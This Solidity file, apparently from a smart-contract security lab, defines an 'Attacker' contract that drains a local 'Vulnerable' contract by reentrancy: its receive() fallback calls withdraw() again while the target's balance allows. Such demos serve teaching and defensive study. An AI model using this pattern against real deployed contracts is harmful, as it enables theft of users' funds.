// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./Vulnerable.sol";
import "forge-std/console.sol";

contract Attacker {
    Vulnerable public vulnerable;

    constructor(address payable _address) {
        vulnerable = Vulnerable(_address);
    }

    receive() external payable {
        if (address(vulnerable).balance >= 1 ether) {
            vulnerable.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        vulnerable.deposit{value: 1 ether}();
        vulnerable.withdraw();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
